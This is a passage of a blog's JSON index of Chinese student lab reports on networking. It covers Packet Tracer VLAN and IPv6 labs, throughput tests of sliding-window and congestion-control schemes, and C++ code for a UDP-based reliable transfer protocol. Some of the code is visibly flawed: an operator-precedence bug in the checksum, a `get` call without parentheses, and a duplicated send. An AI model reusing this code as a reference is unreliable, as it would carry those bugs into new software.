目的MAC地址=ff:ff:ff:ff:ff:ff，是指广播发送","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"wpcap","slug":"wpcap","permalink":"https://gitee.com/michelle19l/michelle19l/tags/wpcap/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"网络技术与应用作业一 PacketTracer的基本使用","slug":"大三上/计网/网技第一次实验","date":"2021-01-30T04:00:01.000Z","updated":"2021-02-22T14:39:29.134Z","comments":true,"path":"2021/01/30/大三上/计网/网技第一次实验/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"网络技术与应用 第一次实验报告 实验一第1节 实验内容说明学习虚拟仿真软件的基本使用方法。 第2节 实验准备在CISCO网站报名packet tracer课程，注册学生账号，下载packet tracer，安装 第3节 实验步骤可以在拓扑图中添加部件 添加连接 运行仿真实验 实验二第1节 实验内容说明在仿真环境下进行==单集线器共享式==以太网组网，测试网络的连通性。 第2节 实验准备说明：本节要包含自己要搭建的拓扑图以及拓扑图中各设备的IP与端口分配情况， 或者包含其他的实验前准备事项，如果没有可以省略本节。 第3节 实验步骤 添加组件 添加集线器（Hub）和终端（end devices） 连线 本次实验使用自动连接，软件自动分配端口和选择合适种类的线，如图可知，软件选择的是直连线（适用于终端和集线器连接） 由线上绿色的三角形可知该图可以成功连通 配置终端ip 单击终端，选择Desktop-&gt;IP Configuration 在IPv4 Address中填写IP地址，要求在==192.168.0.1到192.168.0.255==之间，点击Subnet Mask，自动生成子网掩码 点击右上角的退出配置 用相同的方法配置另一个终端的IP地址，注意==IP地址不可以相同==，配置为192.168.0.2 检测连通性 单击其中的一个终端，选择Desktop-&gt;Command Prompt，输入ping 192.168.0.x(另一台pc的ip地址) 可以ping通 点击右下角的simulation进入仿真，在终端输入ping 192.168.0.2 点击play controls中的play，可以看到信息的传递过程 第4节 实验结果 可以通过集线器连接至其它中终端 消息传递仿真模拟，经过观察发现，消息在两个终端之间来回传送 实验三第1节 实验内容说明在仿真环境下进行==多集线器共享式==以太网组网，测试网络的连通性，并在仿真环境的“模拟”方式中观察数据包的传递过程，进行分析。 第2节 实验准备Packet Tracer 第3节 实验步骤 画出网络拓扑图 注意，终端和集线器连接使用的是直通线，而集线器之间连接使用的是交叉线 用与实验二中相同的方法配置端口 在PC9的终端命令行中尝试连接PC10 使用ping命令 仿真 第4节 实验结果 能够ping通 仿真结果 PC9发送数据至Hub1 消息经过Hub1流向Hub2 信息经过Hub2流向PC10和PC11，其中PC11与数据报中的目的地址并不匹配 PC10将反应消息发给Hub2 消息从Hub2流向另外连接至Hub2的集线器和终端 通过Hub1消息发至PC9，连接成功 实验四第1节 实验内容说明在仿真环境下进行==交换式==以太网组网，并测试连通性 第2节 实验准备Packet Tracer软件 第3节 实验步骤 画出网络拓扑图 使用自动连接，自动按顺序选择交换机的顺序，途中可以看到端口1-5已经开启 为PC1-PC6分配IP地址192.168.0.1-192.168.0.2 配置交换机 利用终端控制台进行配置 添加交换机的控制终端，用PC0的RS232端口连接至Switch0的console端口 点击PC0-&gt;Desktop-&gt;Terminal，设置为9600波特、8个数据位、1个停止位 可以使用命令show mac-address-table，config terminal配置计算机 vlan database ## 进入交换机的VLAN数据库维护模式Vlan 2 name VLAN2 ## 建立编号位2，名字位VLAN2的VLANexit ## 退出VLAN数据库维护模式config terminal ## 进入配置中终端模式interface Fa0&#x2F;1 ## 通知交换机配置端口号1switchport mode accessswitchport access vlan 2 #把交换机端口1分配给VLAN2show vlan 利用设备配置界面进行配置 添加虚拟网络 单击交换机-&gt;config，添加VLAN2和VLAN3 配置端口与虚拟网络的对应关系 配置为PC1、PC2、PC5、PC6连接至VLAN2范围内的端口，PC3、PC4连接至VLAN3范围内的端口 测试连通性，方法同上个实验，在PC终端使用ping命令 打开仿真模式，测试处在相同虚拟网络和不同虚拟网络之间终端的连通性 第4节 实验结果 PC1连接PC5，连接成功 PC1发送信息至交换机 交换机向处在同一个VLAN（VLAN2）内的终端发送信息，由终端辨认目的地址是否吻合 消息在同一个VLAN内继续传播 PC1接收到PC5传回来的信息，显示ping通 &lt;img src=&quot;/images/大三上/网技/第一次实验/image-20201014132840869.png&quot; alt=&quot;image-20201014132840869&quot; style=&quot;zoom:33%;&quot; /&gt; PC1连接PC3，连接失败 PC1发送信息至交换机 交换机将消息发送给相同VLAN内的终端 交换机不能向PC3和PC4发送消息 数据报不断在线路内传递，始终不能传递至正确位置，PC1也不能收到正确的返回数据报","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"wpcap","slug":"wpcap","permalink":"https://gitee.com/michelle19l/michelle19l/tags/wpcap/"},{"name":"packettracer","slug":"packettracer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/packettracer/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"网络技术与应用作业六 IPv6组网与配置","slug":"大三上/计网/网技第六次实验","date":"2021-01-30T04:00:01.000Z","updated":"2021-02-22T14:42:45.195Z","comments":true,"path":"2021/01/30/大三上/计网/网技第六次实验/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"验证性实验（4）IPv6组网与配置实验内容IPv6组网与配置在虚拟仿真环境下进行，要求如下： （1）能对IPv6地址段进行合理划分。 （2）能正确配置路由器的IP地址和路由表。 （3）能利用手工或自动获取方式正确配置主机的IPv6地址。 （4）通过网络连通性测试。 （5）在仿真环境的“模拟”方式中观察IPv6数据报传递过程。 实验准备拓扑图 IPv6地址配置 实验步骤 根据上图所示静态设置四个终端的IPV6地址和默认网关（原理同IPv4） 配置路由器，这里以左边的Router2为例 打开CLI 配置路由器IP 接口0/0对应IP 2001:1::2/64 接口0/1对应IP 2001:2::2/64 配置路由表 打开允许转发单播消息 查看路由表 其中，表项即为刚刚配置的表项 另外一个路由器的配置类似，只是IP地址和路由表投递的地址有变化但原理一致 修改终端IPv6的分配方法为动态分配，即可利用自动获取方式正确配置主机的IPv6地址 实验结果静态实验PC0 ping PC2 动态实验 IPv6的获取 ping 成功","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"packettracer","slug":"packettracer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/packettracer/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"计算机网络作业3-4 性能对比实验","slug":"大三上/计网/计网作业3-4","date":"2021-01-15T04:00:10.000Z","updated":"2021-01-15T06:53:06.590Z","comments":true,"path":"2021/01/15/大三上/计网/计网作业3-4/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-4/","excerpt":"","text":"任务3-4：性能对比实验内容（1）停等机制与滑动窗口机制性能对比； （2）滑动窗口机制中不同窗口大小对性能的影响； （3）有拥塞控制和无拥塞控制的性能比较。 本次实验的数据都是经过三次测试之后取的平均值 表格中的内容为吞吐率大小，单位Kbps 设计思路网络环境不是单一维度，不应该只用“好”和“坏”区分，所以本次实验采用控制变量的方法，分别测试“丢包”和“时延”对不同机制的影响。通过实验发现，不同的机制对于“时延”和“丢包”有不同的效率表现。 （1）停等机制与滑动窗口机制性能对比延时为0，改变丢包率 机制 丢包率 0% 1% 2% 3% 4% 5% 停等 960.825 152.114 125.517 103.731 91.1767 79.642 滑动窗口（GBN） 1044.26 343.323 198.482 136.259 93.7098 69.5384 丢包为0，改变延时 机制 延时0ms 50ms 100ms 150ms 200ms 250ms 停等 960.825 122.832 47.02 36.1274 28.8211 25.0782 滑动窗口（GBN） 1044.26 126.833 70.5729 49.8144 38.5412 31.393 分析 大体上滑动窗口机制比停等机制的效率更高 滑动窗口机制允许发送多条消息，同时等待对方回复的ACK，减少RTT的影响 在有延时的情况下，GBN表现更好 原因同上，停等机制需要每条消息单独等待时延和RTT，而窗口可以同时等待多条 丢包率大时GBN效率比停低 更大的窗口意味着更高的重传代价，大大降低性能 （2）滑动窗口机制中不同窗口大小对性能的影响延时为0，改变丢包率 窗口大小 丢包率 0% 1% 2% 3% 4% 5% 6 1022.322 264.897 168.695 140.271 114.535 90.6781 10 1044.26 343.323 198.482 136.259 93.7098 69.5384 丢包为0，改变延时 窗口大小 延时0ms 50ms 100ms 150ms 200ms 250ms 6 1022.32 125.453 65.6478 45.2397 35.629 29.7989 10 1044.26 126.833 70.5729 49.8144 38.5412 31.393 分析 不同窗口大小在不同网络环境下的效率变化总体上区域一致 在网络情况较好的时候窗口大的效率更高 因为更大的窗口可以允许同时发送更多条消息并同时等待对方的ACK，即减少等待的周期数，更好的应对时延问题。 对于丢包问题，当丢包率较高时由于大的窗口会增加重传代价，效率降低 （3）有拥塞控制和无拥塞控制的性能比较延时为0，改变丢包率 是否有拥塞控制 丢包率 0% 1% 2% 3% 4% 5% 是 1300.11 402.673 201.129 129.408 99.187 80.806 否 1044.26 343.323 198.482 136.259 93.7098 69.5384 丢包为0，改变延时 是否有拥塞控制 延时0ms 50ms 100ms 150ms 200ms 250ms 是 1021.178 109.642 69.5348 46.711 40.013 36.909 否 1044.26 126.833 70.5729 49.8144 38.5412 31.393 分析 在网络情况良好时，有拥塞控制相对于没有拥塞控制效率更高 因为拥塞控制可以允许有更大的窗口 快速重传机制也可以减少等待超时重传的次数。 当网络情况逐渐变差时，拥塞控制机制表现可能并不比没有拥塞控制好 频繁缩小窗口导致窗口较小，小于没有拥塞控制机制的设定值，导致受时延的影响较大 实验过程中也发现，当网络情况变得更差时，拥塞控制机制可能使窗口由几百突然降至1，并进入重传，使得重传代价飞速增加。","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机网络作业3-3 拥塞控制算法","slug":"大三上/计网/计网作业3-3","date":"2021-01-15T04:00:06.000Z","updated":"2021-01-15T06:51:13.408Z","comments":true,"path":"2021/01/15/大三上/计网/计网作业3-3/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-3/","excerpt":"","text":"3-3：拥塞控制算法在任务3-2的基础上，选择实现一种拥塞控制算法，也可以是改进的算法，完成给定测试文件的传输。 *注：由于是基于任务3-2上做的拥塞控制算法改进，只修改了窗口大小，故报文格式等内容不在重复。 注：快速重传只重传收到冗余ack的对应一条报文，不是重传base到sendnextseq之间的所有内容 拥塞控制算法状态机 初始状态：慢启动 窗口大小为1，阈值32 如果收到新的ACK，窗口大小＋1，效果为单位时间内呈指数增长 如果收到冗余ACK，标记，若连续收到三次冗余ACK 启动快速重传 阈值设为窗口大小的一半 窗口大小设置为阈值+3 进入快速恢复阶段 当窗口大小&gt;=阈值时，进入拥塞避免阶段 若超时没有收到新的ACK 阈值=窗口大小/2 窗口大小=1 重新进入慢启动阶段 拥塞避免 每收到一个新的ACK，窗口大小增长为1/窗口大小，即单位时间呈线性增长 如果收到冗余ACK，标记，若连续收到三次冗余ACK 启动快速重传 阈值设为窗口大小的一半 窗口大小设置为阈值+3 进入快速恢复 若超时没有收到新的ACK 阈值=窗口大小/2 窗口大小=1 重新进入慢启动阶段 快速恢复 每收到一个冗余的ACK，窗口大小+1，直到窗口大小&gt;=阈值，进入拥塞避免阶段 代码DWORD WINAPI recvhandler(LPVOID lparam)&#123; printwindow(); int i = (int)(LPVOID)lparam; //cout &lt;&lt; \"接收\" &lt;&lt; i &lt;&lt; endl; clock_t finalovertime; int t = 0; while (base &lt; buffersize) &#123; if (sendnextseq &gt; base + N || sendnextseq == base)//窗口已满（对方还没有发送ack）或者窗口为空 Sleep(2); message a; simplerecv(a); if (a.get_ack())//收到确认消息且序号正确 &#123; clockstart = clock();//重置计时器 if (a.ackseq &gt;= base)//收到正确的消息序号 &#123; if (constatus == 0) &#123; N += a.ackseq - base + 1;//累积确认 if (N &gt;= ssthresh) constatus = 1;//拥塞避免 &#125; else if (constatus == 1) &#123; N += (a.ackseq - base + 1) / N;//线性增长 &#125; printwindow(); base = a.ackseq + 1; overtime = 0; t = 0; &#125; else if (a.ackseq &lt;= base-1) &#123; t++; cout &lt;&lt; t &lt;&lt; endl; printwindow(); if (constatus == 2) &#123;//快速恢复 N += 1; if (N &gt;= ssthresh) constatus = 1;//进入拥塞避免阶段 &#125; if (t == 3)//三个冗余ack &#123; constatus = 2; //快速重传 overtime = 1; &#125; &#125; &#125; clockend = clock(); &#125; cout &lt;&lt; \"exitpoint2\" &lt;&lt; endl; return 1;&#125; DWORD WINAPI sendhandler(LPVOID lparam)//发线程&#123; int flag = 0; clock_t s = clock(); while (base &lt; buffersize) &#123; int i = (int)(LPVOID)lparam; if (!overtime) &#123; int temp = base; if (base + N == sendnextseq) Sleep(40); for (; sendnextseq &lt; base + N &amp;&amp; sendnextseq &lt; buffersize; sendnextseq++) &#123; flag = 0;//正常发送 if (!overtime) &#123; simplesend(msgsend[sendnextseq]); s = clock(); //Sleep(20); &#125; else &#123; break; &#125; simplesend(msgsend[sendnextseq]); if (temp == base) &#123; clock_t e = clock(); if ((e - s) / CLOCKS_PER_SEC &gt;= WAIT_TIME)//超时重发 &#123; overtime = 1; sendnextseq++; break; &#125; &#125; &#125; &#125; if (overtime == 1)//重新发送 &#123; if (constatus == 1 || constatus == 0) &#123; ssthresh = N / 2; N = 1; constatus = 0;//重新进入慢启动阶段 printwindow(); &#125; else if (constatus == 2) &#123;//快速重传 ssthresh = N / 2; N = ssthresh + 3; &#125; if (flag) Sleep(10);//减少重传次数 for (int i = base; i &lt; sendnextseq; i++) &#123; //重新发送 if (overtime) simplesend(msgsend[i]); else break; flag++; &#125; overtime = 0;//重传标识归0 s = clock();//重置计时器 &#125; clock_t e = clock(); if ((e - s) / CLOCKS_PER_SEC &gt;= WAIT_TIME)//超时重发 overtime = 1; &#125; cout &lt;&lt; \"exitpoint1\" &lt;&lt; endl; return 0;&#125;","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"socket","slug":"socket","permalink":"https://gitee.com/michelle19l/michelle19l/tags/socket/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"计算机网络作业3-2 基于UDP服务设计可靠传输协议并编程实现","slug":"大三上/计网/计网作业3-2","date":"2021-01-15T04:00:04.000Z","updated":"2021-01-15T06:47:11.301Z","comments":true,"path":"2021/01/15/大三上/计网/计网作业3-2/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A3-2/","excerpt":"","text":"实验3：基于UDP服务设计可靠传输协议并编程实现实验内容：任务3-2：在任务3-1的基础上，将停等机制改成基于滑动窗口的流量控制机制，采用固定窗口大小，支持累积确认，完成给定测试文件的传输。 报文格式 #pragma pack(1)//以下内容按1Byte对齐，如果没有这条指令会以4Byte对齐，例如u_short类型会用2B存信息，2B补零，方便后续转换成char*格式struct message//报文格式&#123; //ACK=0x01, SYN=0x02, FIN=0x04,EXIST 0x10,startfile 0x20,endfile 0x40 int flag;//标志位 DWORD SendIP, RecvIP;//发送端IP和接收端IP u_short SendPort, RecvPort;//发送端端口和接收端端口 int msgseq;//消息序号 int ackseq;//恢复ack时确认对方的消息的序号 int index;//用于描述文件大小，需要多少条消息才能传输完成（1条index=0,2条index=1，以此类推） int filelength;//本次实验使用固定报文长度，故只需要告诉对方有多少条和最后一条除首部信息外有多少位有效信息 int fill;//补零成为16bit的倍数，便于计算校验和 u_short checksum;//校验和 char msg[BUF_SIZE];//报文的具体内容，本次实验简化为固定长度&#125;;#pragma pack()//恢复4Byte编址格式 滑动窗口与累积确认代码见附录-消息处理流程 变量client端： msgsend：用于存储发送的消息，一维数组 base：窗口底部，代表消息msgsend[0:base-1]部分已经全部传输完毕，且收到了对方返回的对应ACK，msgsend[base]是下面要接收对应ACK的消息 N：窗口大小，msgsend[base:base+N-1]是当前允许发送的消息，本次实验取N=10 sendnextseq：下一条要发送的消息 server端： msgrecv：用于存储接收的消息，一维数组 recvnextseq：下一条要接收并返回ACK的消息，编号小于recvnextseq的消息已经全部返回ACK 执行过程server端： 按顺序接收对方发来的消息msgseq（收到的消息序号）==recvnextseq，且校验和正确，返回对应的ACK（ackseq=msgseq） 如果发生消息失序，即msgseq!=recvnextseq，或校验和错误，则丢弃消息，返回第recvnextseq-1条消息的ACK client端： 注： 为了实现消息的同时收发，提高效率，使用多线程编程 为了避免线程间信息交互带来的问题，计时器部分全部在发送线程完成 靠client端的接收线程完成 接收对方返回的ACK，其中的ackseq代表msgsend[0:ackseq](包含ackseq)已经全部被对方收到且确认 如果base&lt;ackseq+1，则说明server端对新消息进行了确认，滑动窗口，使base=ackseq+1，并重置计时器 如果base&gt;=ackseq，则说明server端或client端发送的消息发生了失序，由于msgsend[0:base-1]已经被确认，所以可以不对该项情况进行处理，直接跳过等待接收下一条消息即可 发送线程 滑动窗口机制需要在发送前预先将窗口内的消息存储至内存中 如果窗口未满且当前状态不需要重传，则继续发送信息，发送完毕后重置计时器 如果超时未收到对方发来的所需的ACK，则按超时处理，重新发送窗口中已发送但是未确认的消息 如果出现重发一定次数依然无法收到所需ACK的情况，进行断网处理 当所有消息都被对方确认即base==buffersize（发送缓冲区），结束当前发送线程 交互流程由于采用的是滑动窗口机制，在client端在发送消息之前，需要将要发送的消息存储输入msgsend中，如果传输的消息过大，应采用分片处理，即分多次存入数组，为了减小重传代价，每片都应添加SYN和FIN消息。这里由于需要发送的文件较小，略过分片功能 注：下面所说的”client端发送“是指将消息添加至发送缓冲区 client端：（采用滑动窗口机制，没有明确的状态设置） 建立连接：发送一条带有标识SYN的消息，表示希望建立连接 发送文件： 消息1，文件开始标识位SF=1，index=发送文件需要的消息条数-1，filelength=最后一条消息msg成员的有效位数。 发送文件，每条msg的有效长度固定为1024，最后一条EF=1 断开连接：发送一条标识为FIN的消息 server端： ​ - 初始：状态0 建立连接：收到一条SYN，回复对应的ACK，连接建立成功，进入状态1 发送文件：收到包含SF、index、filelength的消息，开始接收文件，进入状态2。对于每条消息都返回一条ACK 。当收到包含标志位EF的消息，检查index与收到文件消息的条数，若一致，则返回ACK，退回状态1 断开连接：收到包含标识为FIN的消息，返回ACK，进入状态0 注：当server端和client端在一定时间内没有接收或不能接收到对方的消息，需要做断网处理，即自动退回到状态0 建立连接由于只需实现文件的单向传输，所以只需两次握手即可建立连接 int buildconnectionCli()//客户端，连接发起方&#123; message a; a.set_syn();//SYN a.msgseq = buffersize; message::copy(msgsend[buffersize++], a); return 1;&#125; 连接断开与连接建立类似，由于是单向传输，两次挥手即可 int byecli()//server端只需要回复ACK，功能比较简单没有封装成函数，处理流程详见附录&#123; message a; a.set_fin();//FIN a.msgseq = buffersize; message::copy(msgsend[buffersize++], a);//添加至发送消息队列中 return 1;&#125; 差错重传使用校验和方式检测是否出现差错，校验和计算方式与rdt3.0类似，只是根据本次实验设计的报文格式进行了简单修改。校验和计算包括0-255bit。 计算方法如下 void message::setchecksum()//发送方计算校验和并填入响应位置&#123; int sum = 0; u_char* temp = (u_char*)this;//以1B为单位进行处理，注意设置为unsigned类型，否则在后续相加时会按照默认最高位是正负号，影响计算结果 for (int i = 0; i &lt; 16; i++)//取报文的前16组，每组16bit，共计32字节256bit &#123; sum += temp[2 * i] &lt;&lt; 8 + temp[2 * i + 1]; while (sum &gt;= 0x10000) &#123;//溢出 int t = sum &gt;&gt; 16;//将最高位回滚添加至最低位 sum += t; &#125; &#125; this-&gt;checksum = ~(u_short)sum;//按位取反，方便校验计算&#125; bool message::checkchecksum()//接收方对校验和进行检验&#123; int sum = 0; u_char* temp = (u_char*)this; for (int i = 0; i &lt; 16; i++) &#123; sum += temp[2 * i] &lt;&lt; 8 + temp[2 * i + 1]; while (sum &gt;= 0x10000) &#123;//溢出 int t = sum &gt;&gt; 16;//计算方法与设置校验和相同 sum += t; &#125; &#125; //把计算出来的校验和和报文中该字段的值相加，如果等于0xffff，则校验成功 if (checksum + (u_short)sum == 65535) return true; return false;&#125; 当server端检测到校验和错误时，不发送NAK，只返回对当前已经确认的消息序号，等待client端超时重新发送。 文件传输 client端： 读入文件至内存中 文件起始消息SF置1，将发送文件所需要的消息条数index和最后一条消息msg段有效位数填入报头中index和filelength相应位置，msg成员填入文件名 将内存中的消息复制到message类对象的msg段 最后一条消息EF置1，告知对方文件发送结束 //读入文件void readfile(char* name,char content[10000][1024],int &amp;length, int &amp; index)&#123; index = 0; length = 0; ifstream in(name, ifstream::binary);//以二进制方式读入文件 if (!in) &#123; cout &lt;&lt; \"文件无效\" &lt;&lt; endl; return; &#125; char t = in.get(); while (in)//如果读入失败（读入完成）则退出 &#123;//将文件内容存入content数组中 content[index][length % 1024] = t;//每行1024个字节，对应msg成员长度为1024 length++; if (length % 1024 == 0)//上一条缓冲区 &#123; index++; length = 0; &#125; t = in.get; &#125; in.close();&#125; int sendfile(char* name)//发送文件&#123; //开始发送文件消息 message a; a.set_startfile();//设置SF标识 int index = 0; int length = 0; readfile(name, content, length, index);//读入文件，复制到content二维数组 a.index = index;//文件大小相关信息 a.filelength = length; strcpy(a.msg, name);//文件基本信息 a.msgseq = buffersize;//设置消息序号 message::copy(msgsend[buffersize++], a);//添加到发送消息队列中 if (index==0 &amp;&amp; length == 0)//读入0个字节 &#123; return 0;//文件读入失败 &#125; //文件具体内容 for (int i = 0; i &lt; index; i++) &#123; for (int j = 0; j &lt; 1024; j++) &#123; msgsend[buffersize].msg[j] = content[i][j]; &#125; msgsend[buffersize].msgseq = buffersize; buffersize++;//发送缓冲区大小增加 &#125; for (int i = index; i &lt;= index; i++) &#123;//添加文件的最后一条消息 message b; for (int j = 0; j &lt; length; j++) &#123; b.msg[j] = content[i][j]; &#125; b.msgseq = buffersize; b.set_endfile();//添加EF标识 message::copy(msgsend[buffersize++], b); &#125; return 1;&#125; server端： 接收到包含SF=1的消息，读出index、filelength和文件名，返回ACK 循环接收对方发来的消息，使用多线程将msg段复制到内存中，逐条返回ACK //处理接收到的文件消息DWORD WINAPI filehandler(LPVOID lparam)&#123;//多线程函数只能传入一个参数，多个参数需要打包成class或者struct filepacket* pkt = (filepacket*)(LPVOID)lparam; memset(content[pkt-&gt;index], 0, 1024); for(int j=0;j&lt;pkt-&gt;length;j++) &#123;//可能中间会有'\\0'不可以直接使用strcpy content[pkt-&gt;index][j] = pkt-&gt;a.msg[j]; &#125; return 0;&#125; 当收到的消息包含标识为EF时，表示该条消息msg段有效位数为filelength，将其复制到内存中。校验index与收到文件消息的条数，如果正确返回ACK 将内存中的数据写入文件 void outfile(char* name, char content[50000][1024], int length, int&amp; index)&#123; ofstream fout(name, ofstream::binary);//以二进制方式写入文件 for (int i = 0; i &lt; index; i++) &#123; for (int j = 0; j &lt; FILE_PACKET_LENGTH; j++) fout &lt;&lt; content[i][j];//以字节为单位进行写入 &#125; for (int j = 0; j &lt; length; j++) fout &lt;&lt; content[index][j]; fout.close();&#125; 附录socket的创建头文件 #include &lt;WinSock2.h&gt;//windows socket 编程头文件#pragma comment(lib,\"ws2_32.lib\")//链接ws2_32.lib库文件到此项目中 //加载socket库WSADATA wsaData;//MAKEWORD(2.2),成功返回0if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0)&#123; cout &lt;&lt; \"socket初始化失败\" &lt;&lt; endl; return 0;&#125;//创建Socket//创建一个socket，并将该socket绑定到一个特定的传输层sock = socket(AF_INET, SOCK_DGRAM, 0);//地址类型（ipv4）,数据报套接字if (sock == INVALID_SOCKET)&#123; cout &lt;&lt; \"socket创建失败\"; return -1;&#125;//设置recv函数为非阻塞struct timeval timeout;timeout.tv_sec = 1;//秒timeout.tv_usec = 0;//微秒if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&amp;timeout, sizeof(timeout)) == -1) &#123; cout &lt;&lt; \"setsockopt failed:\";&#125;cout &lt;&lt; \"server3-1\" &lt;&lt; endl;//初始化地址,代码支持输入IP，这里只演示了使用默认IP的情况addrop.sin_addr.s_addr = inet_addr(\"192.168.89.1\");addrop.sin_family = AF_INET;//IPv4addrop.sin_port = htons(SPORT);//端口，30000addr.sin_addr.s_addr = inet_addr(\"192.168.89.1\");addr.sin_family = AF_INET;addr.sin_port = htons(CPORT);//6666//绑定//强制类型转换，SOCKADDR_IN方便赋值 SOCKADDR方便传输//server端需要bind而client端不需要if (bind(sock, (SOCKADDR*)&amp;addrop, sizeof(SOCKADDR)) == -1)&#123; cout &lt;&lt; \"bind error\" &lt;&lt; endl; return -1;&#125;......//程序执行，消息收发closesocket(sock);//关闭socketWSACleanup();return 0; 消息的发送与接收 为了简化后续代码，将send和recv简化封装成函数 注意这里由于使用的是UDP，每次发送和接收都需要指明目的或者来源IP地址 void simplesend(message&amp; a)&#123; a.set_exist();//表示该条消息存在，方便非阻塞式recv判断是否接收到了消息 a.setchecksum();//设置校验和 //用sock发送a中的内容，注意第二个参数是char*，所以需要强制类型转换 //第三个参数为发送缓冲区长度，注意不能设置过长，否则会造成缓冲区溢出 //第四个代表相关操作，一般设置为0 //第五个是目的IP地址，即向哪个IP发送消息 //第六个是addr的长度 if (sendto(sock, (char*)&amp;a, sizeof(message), 0, (struct sockaddr*)&amp;addr, sizeof(sockaddr)) == SOCKET_ERROR);//如果发送失败，这里由于后续有确认重传机制，不在发送函数中进行处理 &#123; &#125; //打印每条发送报文标志位相关信息，方便观察传输过程，由于IO时间消耗很大，这里注释掉 //if (a.flag) &#123; cout &lt;&lt; \"发送 \"; a.print(); &#125;&#125;void simplerecv(message&amp; a)&#123; memset(a.msg, 0, sizeof(a.msg));//初始化全为0，防止收到前面收到消息的影响 //参数与sendto函数类似，只是第五项的目的IP地址改为源IP地址，即从哪个IP接收消息 recvfrom(sock, (char*)&amp;a, sizeof(message), 0, (struct sockaddr*)&amp;addr, &amp;addr_len); //if (a.flag) &#123; cout &lt;&lt; \"接收 \"; a.print(); &#125;&#125; 支持用户输入IP //这里仅以一端作为演示cout &lt;&lt; \"是否使用默认IP？是1，否2 \";int i;cin &gt;&gt; i;if (i == 2)&#123; char s[20] = &#123;&#125;; char c[20] = &#123;&#125;; cout &lt;&lt; \"请输入服务器IP: \" ; 